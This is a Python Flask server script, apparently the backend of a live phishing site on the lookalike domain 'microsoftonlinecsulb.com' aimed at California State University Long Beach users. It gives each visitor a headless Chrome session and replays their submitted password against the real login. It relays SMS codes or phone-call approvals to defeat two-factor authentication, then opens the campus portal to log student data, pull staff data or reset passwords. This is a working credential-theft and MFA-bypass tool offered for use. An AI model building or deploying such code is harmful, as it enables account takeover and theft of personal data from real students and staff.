from flask import Flask , redirect, url_for, render_template, request,jsonify
from OpenSSL import SSL
import atexit
import random, string, os
import time
import main
import os
import threading
from _thread import start_new_thread



app = Flask(__name__)
context = ('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem', '/etc/letsencrypt/live/microsoftonlinecsulb.com/privkey.pem')




connections = {}
twofa_code = {}
submitted = {}

conQueue = []
codes=[]
def removeFromConnections():
    time.sleep(600)
    if len(conQueue) > 1:
        try:
            tmp = conQueue.pop()
            connections[tmp].driver.close()
            del connections[tmp]
        except:
            pass

# chrome = main.startChrome()

@app.route('/profile')
def profile():
    return 'Profile'



@app.route('/requestCode', methods=['GET','POST'])
def requestCode():
    print("request code py")
    try:
        # print(type(chrome))
        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].request_text()
        return "True"
    except Exception as E:
        print("text requestCode.text error")
        print(E)
        call()
        # chrome.restart()
        return "False"

@app.route('/text', methods=['GET', 'POST'])
def text():
    # Here we use a class of some kind to represent and validate our
    # client-side form data. For example, WTForms is a library that will
    # handle this for us, and we use a custom LoginForm to validate.
    code = request.form.get('code')
    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) 
    try:
        if code in codes:
        # if submitted[ip] == True or (code in codes):
            return render_template('index.html')
        submitted[ip] = True
    except:
        print("ip error")
    codes.append(code)
    print(code)
    # yield redirect("https://sso.csulb.edu/")
    print("still here")
    try:
        # yield render_template('index.html')
        connections[ip].enterCode(code)
    except:
        print("text chrome.text error")
        submitted[ip] = False
        connections[ip].restart()
    time.sleep(20)
    try:
        connections[ip].open_mycsulb()
    except:
        print("text chrome_opensulb error")
        submitted[ip] = False
        connections[ip].restart()

    if "student" in connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)].email:  
            connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].log_info()
    else:
        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].resetPassword()

    submitted[ip] = False
    return render_template('index.html')
@app.route('/loginfo', methods=['GET', 'POST'])
def loginfo():
    connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].open_mycsulb()
    try:
        if "student" in connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)].email:  
            connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].log_info()
        else:
            connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].resetPassword()
    except:
        print("auth error")
        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].restart()
    return render_template('index.html')
@app.route('/call', methods=['GET', 'POST'])
def call():
    # Here we use a class of some kind to represent and validate our
    # client-side form data. For example, WTForms is a library that will
    # handle this for us, and we use a custom LoginForm to validate.
    try:
        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].call()
    except:
        print("call chrome.call error")
        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].restart()
    time.sleep(30)
    try:
        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].open_mycsulb()
    except:
        print("call open_mycsulb() error")
        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].restart()
    try:
        if "student" in connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)].email:  
            connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].log_info()
        else:
            # connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].resetPassword()
            connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].logProfData()
    except:
        print("call log_info() error")
        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].restart()

    return render_template('index.html')
        
@app.route('/login', methods=['GET', 'POST'])
def login():
    # Here we use a class of some kind to represent and validate our
    # client-side form data. For example, WTForms is a library that will
    # handle this for us, and we use a custom LoginForm to validate.
    email = request.form.get('username')
    password = request.form.get('password')
    if email=="" or password=="":
       return render_template('index.html')
    # print(email,password)
    try:
        var = connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].login_email(email,password)
        if var == "auth":
        #stop loading
        
            print("its true")
            check1="<div id='check' />"
            with open('./static/'+email+'.txt','w') as file:
                file.write("auth")
            
        else:
        #stop loading
        
            print("its true")
            check1="<div id='check' />"
            with open('./static/'+email+'.txt','w') as file:
                file.write("norm")
            # os.system('chmod 777 '+email+'.txt')
    except Exception as e:
        print("get var error",e)
        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].restart()
    return render_template('index.html')
    
        

@app.route('/about')
def about():
    return 'This is the about page.'

@app.route("/")
def home():
    conQueue.append(request.environ.get('HTTP_X_REAL_IP', request.remote_addr))
    submitted[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)] =False
    connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)] =  main.startChrome()
    return render_template("index.html")


def deleteDrivers():
    print("cleanup")
    for i in connections:
        connections[i].driver.close()

atexit.register(deleteDrivers)

app.run(host='0.0.0.0', port=443, threaded=True, ssl_context=context, debug=True)

#this stuff is no longer supported
# context = SSL.Context(SSL.TLSv1_2_METHOD)
# context.use_privatekey_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/privkey.pem')
# context.use_certificate_chain_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/fullchain.pem')
# context.use_certificate_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem')


# use threads to start this and give the thread the name of email or ip
# def task():
#     chrome = main.startChrome()
#     return chrome
#     # your code here

# # # create and start threads
# # # creates 5 instances where, up to five people are able to run our code
# for i in range(5):
#     thread = threading.Thread(target=task)
#     thread.start()

# mofified code from runmain.py to work w/ flask
# @app.route('/main', methods=['POST'])
# def main():
#     email = request.form.get('email')
#     password = request.form.get('password')

#     main.login_email(email, password)

#     while not os.path.exists(email+"call.txt"):
#         time.sleep(2)

#     with open(email+"call.txt") as file:
#         var_return = file.readline().strip()

#     if var_return == "1":
#         main.call()
#     else:
#         main.text(email)

#     main.open_mycsulb()
#     main.log_info(email, password)
#     main.driver.close()


#added routes to work w/ the app.js code

# @app.route('/check_login', methods=['POST'])
# def check_login():
#     username = request.json.get('username')

#     # Check if the user is logged in
#     loggedIn = False
#         # if the user isn't logged in? 

#     return jsonify({'loggedIn': loggedIn})

# @app.route('/check_file', methods=['POST'])
# def check_file():
#     filename = request.json.get('filename')

#     # Check if the file exists
#     exists = False
#     # what do we need to do if the file doesn't exist?

#     return jsonify({'exists': exists})


# @main.route('/mydata', methods = ['POST'])
# def view_data():
#      if request.method == 'POST':
#         user =  request.form["email"]
#         pswd = request.form["password"]
#         barChartData = ""
#         pieChartData = ""
#         #temp if statement that needs to be replaced with user validation
#         if 1 == 1:
#             #files containing the json formats needed for HighCharts
#             with open('./'+user+'/topTags.json', 'r') as file:
#                 pieChartData = json.loads(file.read())
#             #with open('./'+user+'/'+pswd, 'r') as file:
#             with open('./'+user+'/topten.json', 'r') as file:
#                 barChartData = json.loads(file.read())
#             return render_template("chart.html", topTenData=json.dumps(barChartData), pieData=json.dumps(pieChartData))
#         else:
#             return redirect(url_for(home))


# #creates a string of the filenames from upload_files and uses it as an argument for c++ program
# def processFiles(userhash):
#     fileList = []
#     for file in os.listdir('./'+userhash+'/'):
#         if file.endswith(".json"):
#             fileList.append('./'+userhash+'/' + file)
#     arg = ' '.join(fileList)
#     #start c++ project to process the initall data
#     os.system("./Spotify " + arg)
#     processData(userhash)


# def text_task(code):
#     chrome = main.startChrome()
#     chrome.text(code)
#     time.sleep(20)
#     chrome.open_mycsulb()
#     chrome.log_info()

# def call_task():
#     chrome = main.startChrome()
#     chrome.call()
#     time.sleep(20)
#     chrome.open_mycsulb()
#     chrome.log_info()

# @app.route('/text', methods=['GET', 'POST'])
# def text():
#     code = request.form.get('code')

#     # create and start thread for this request
#     thread = threading.Thread(target=text_task, args=(code,))
#     thread.start()

#     return render_template('index.html')

# @app.route('/call', methods=['GET', 'POST'])
# def call():
#     # create and start thread for this request
#     thread = threading.Thread(target=call_task)
#     thread.start()

#     return render_template('index.html')

# define functions to be run in separate threads
# def login_task(email, password):
#     chrome = main.startChrome()
#     var = chrome.login_email(email, password)
#     if var == True:
#         #stop loading
#         print("its true")
#         check1="<div id='check' />"
#         with open('./static/'+email+'.txt','w') as file:
#             file.write("1")

# @app.route('/login', methods=['GET', 'POST'])
# def login():
#     email = request.form.get('username')
#     password = request.form.get('password')

#     # create and start thread for this request
#     thread = threading.Thread(target=login_task, args=(email, password))
#     thread.start()

#     return render_template('index.html')
